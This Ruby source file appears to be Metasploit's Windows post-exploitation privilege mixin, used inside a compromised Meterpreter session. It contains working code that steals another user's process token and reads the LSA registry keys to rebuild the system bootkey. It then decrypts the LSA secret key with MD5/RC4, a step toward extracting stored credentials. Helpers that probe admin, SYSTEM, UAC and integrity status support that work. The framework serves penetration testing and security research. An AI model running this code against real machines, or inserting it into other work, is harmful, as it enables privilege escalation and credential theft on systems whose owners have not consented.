# -*- coding: binary -*-

module Msf::Post::Windows::Priv
  include ::Msf::Post::Windows::Accounts
  include Msf::Post::Windows::Registry
  include Msf::Post::Windows::Version
  include Msf::Util::WindowsCryptoHelpers

  INTEGRITY_LEVEL_SID = {
    low: 'S-1-16-4096',
    medium: 'S-1-16-8192',
    high: 'S-1-16-12288',
    system: 'S-1-16-16384'
  }.freeze

  SYSTEM_SID = 'S-1-5-18'.freeze
  ADMINISTRATORS_SID = 'S-1-5-32-544'.freeze

  # http://technet.microsoft.com/en-us/library/dd835564(v=ws.10).aspx
  # ConsentPromptBehaviorAdmin
  UAC_NO_PROMPT = 0
  UAC_PROMPT_CREDS_IF_SECURE_DESKTOP = 1
  UAC_PROMPT_CONSENT_IF_SECURE_DESKTOP = 2
  UAC_PROMPT_CREDS = 3
  UAC_PROMPT_CONSENT = 4
  UAC_DEFAULT = 5

  def initialize(info = {})
    super(
      update_info(
        info,
        'Compat' => {
          'Meterpreter' => {
            'Commands' => %w[
              stdapi_railgun_api
              stdapi_registry_open_key
              stdapi_sys_config_getsid
              stdapi_sys_config_steal_token
              stdapi_sys_config_sysinfo
              stdapi_sys_process_get_processes
            ]
          }
        }
      )
    )
  end

  #
  # Returns true if user is admin and false if not.
  #
  def is_admin?
    if session_has_ext
      # Assume true if the OS doesn't expose this (Windows 2000)
      begin
        return session.railgun.shell32.IsUserAnAdmin()['return']
      rescue StandardError
        true
      end
    end

    local_service_key = registry_enumkeys('HKU\S-1-5-19')

    !local_service_key.blank?
  end

  # Steals the current user's token.
  # @see steal_token
  def steal_current_user_token
    steal_token(get_env('COMPUTERNAME'), get_env('USERNAME'))
  end

  #
  # Steals a token for a user.
  # @param String computer_name Computer name.
  # @param String user_name To token to steal from. If not set, it will try to steal
  #                        the current user's token.
  # @return [boolean] TrueClass if successful, otherwise FalseClass.
  # @example steal_token(get_env('COMPUTERNAME'), get_env('USERNAME'))
  #
  def steal_token(computer_name, user_name)
    pid = nil

    session.sys.process.processes.each do |p|
      if p['user'] == "#{computer_name}\\#{user_name}"
        pid = p['pid']
      end
    end

    unless pid
      vprint_error("No PID found for #{user_name}")
      return false
    end

    vprint_status("Stealing token from PID #{pid} for #{user_name}")

    begin
      session.sys.config.steal_token(pid)
    rescue Rex::Post::Meterpreter::RequestError => e
      # It could raise an exception even when the token is successfully stolen,
      # so we will just log the exception and move on.
      elog(e)
    end

    true
  end

  #
  # Returns true if in the administrator group
  #
  def is_in_admin_group?
    whoami = get_whoami

    if whoami.nil?
      print_error('Unable to identify admin group membership')
      return nil
    elsif whoami.include? ADMINISTRATORS_SID
      return true
    else
      return false
    end
  end

  #
  # Returns true if running as Local System
  #
  def is_system?
    if session_has_ext
      return session.sys.config.is_system?
    end

    sam = registry_enumkeys('HKLM\SAM\SAM')

    !sam.blank?
  end

  #
  # Returns true if UAC is enabled
  #
  # Returns false if the session is running as system, if uac is disabled or
  # if running on a system that does not have UAC
  #
  def is_uac_enabled?
    uac = false
    version = get_version_info
    if version.build_number >= Msf::WindowsVersion::Vista_SP0 && !is_system?
      begin
        enable_lua = registry_getvaldata(
          'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System',
          'EnableLUA'
        )
        uac = (enable_lua == 1)
      rescue Rex::Post::Meterpreter::RequestError => e
        print_error("Error Checking if UAC is Enabled: #{e.class} #{e}")
      end
    end
    return uac
  end

  #
  # Returns the UAC Level
  #
  # @see http://technet.microsoft.com/en-us/library/dd835564(v=ws.10).aspx
  # 2 - Always Notify, 5 - Default, 0 - Disabled
  #
  def get_uac_level
    begin
      uac_level = registry_getvaldata(
        'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System',
        'ConsentPromptBehaviorAdmin'
      )
    rescue Rex::Post::Meterpreter::RequestError => e
      print_error("Error Checking UAC Level: #{e.class} #{e}")
    end

    if uac_level
      return uac_level
    else
      return nil
    end
  end

  #
  # Returns the Integrity Level
  #
  def get_integrity_level
    whoami = get_whoami

    if whoami.nil?
      print_error('Unable to identify integrity level')
      return nil
    else
      INTEGRITY_LEVEL_SID.each_pair do |_k, sid|
        if whoami.include? sid
          return sid
        end
      end
    end
  end

  #
  # Returns true if in a high integrity, or system, service
  #
  def is_high_integrity?
    il = get_integrity_level
    (il == INTEGRITY_LEVEL_SID[:high] || il == INTEGRITY_LEVEL_SID[:system])
  end

  #
  # Returns the output of whoami /groups
  #
  # Returns nil if Windows whoami is not available
  #
  def get_whoami
    whoami = cmd_exec('cmd.exe /c whoami /groups')

    if whoami.nil? || whoami.empty?
      return nil
    elsif whoami =~ (/is not recognized/) || whoami =~ (/extra operand/) || whoami =~ (/Access is denied/)
      return nil
    else
      return whoami
    end
  end

  #
  # Return true if the session has extended capabilities (ie meterpreter)
  #
  def session_has_ext
    return !!(session.railgun and session.sys.config)
  rescue NoMethodError
    return false
  end

  #
  # Returns the unscrambled bootkey
  #
  def capture_boot_key
    bootkey = ''
    basekey = 'System\\CurrentControlSet\\Control\\Lsa'

    %w[JD Skew1 GBG Data].each do |k|
      begin
        ok = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, basekey + '\\' + k, KEY_READ)
      rescue Rex::Post::Meterpreter::RequestError
      end

      return nil if !ok

      bootkey << [ok.query_class.to_i(16)].pack('V')
      ok.close
    end

    keybytes = bootkey.unpack('C*')
    descrambled = ''
    descrambler = [ 0x0b, 0x06, 0x07, 0x01, 0x08, 0x0a, 0x0e, 0x00, 0x03, 0x05, 0x02, 0x0f, 0x0d, 0x09, 0x0c, 0x04 ]

    0.upto(keybytes.length - 1) do |x|
      descrambled << [keybytes[descrambler[x]]].pack('C')
    end

    return descrambled
  end

  #
  # Returns the LSA key upon input of the unscrambled bootkey
  #
  # @note This requires the session be running as SYSTEM
  #
  def capture_lsa_key(bootkey)
    vprint_status('Getting PolSecretEncryptionKey...')
    pol = registry_getvaldata('HKLM\\SECURITY\\Policy\\PolSecretEncryptionKey', '')
    if pol
      print_status('XP or below system')
      @lsa_vista_style = false
      md5x = Digest::MD5.new
      md5x << bootkey
      1000.times do
        md5x << pol[60, 16]
      end

      rc4 = OpenSSL::Cipher.new('rc4')
      rc4.decrypt
      rc4.key = md5x.digest
      lsa_key = rc4.update(pol[12, 48])
      lsa_key << rc4.final
      lsa_key = lsa_key[0x10..0x1F]
    else
      print_status('Vista or above system')
      @lsa_vista_style = true

      vprint_status("Trying 'V72' style...")
      vprint_status('Getting PolEKList...')
      pol = registry_getvaldata('HKLM\\SECURITY\\Policy\\PolEKList', '')

      # If that didn't work, then we're out of luck
      return nil if pol.nil?

      lsa_key = decrypt_lsa_data(pol, bootkey)
      lsa_key = lsa_key[68, 32]
    end

    vprint_good(lsa_key.unpack('H*')[0])
    return lsa_key
  end

  # Whether this system has Vista-style secret keys
  #
  # @return [Boolean] True if this session has keys in the PolEKList
  #   registry key, false otherwise.
  def lsa_vista_style?
    if @lsa_vista_style.nil?
      @lsa_vista_style = !registry_getvaldata('HKLM\\SECURITY\\Policy\\PolEKList', '').nil?
    end

    @lsa_vista_style
  end
end
